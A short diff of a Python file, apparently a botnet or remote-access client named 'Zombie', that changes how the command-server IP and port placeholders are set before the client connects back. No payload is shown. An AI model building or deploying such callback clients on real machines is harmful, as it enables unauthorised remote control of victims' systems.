@@ -143,7 +143,10 @@ class Zombie:
 
 
 def start_zombie():
-    zombie = Zombie(server_ip='replace_server_ip', server_port='replace_server_port', is_encrypted=False)
+    server_ip = 'replace_server_ip'
+    server_port = 'replace_server_port'
+    server_port = int(server_port)
+    zombie = Zombie(server_ip=server_ip, server_port=server_port, is_encrypted=False)
     zombie.connect_to_server()
 
 if __name__ == '__main__':
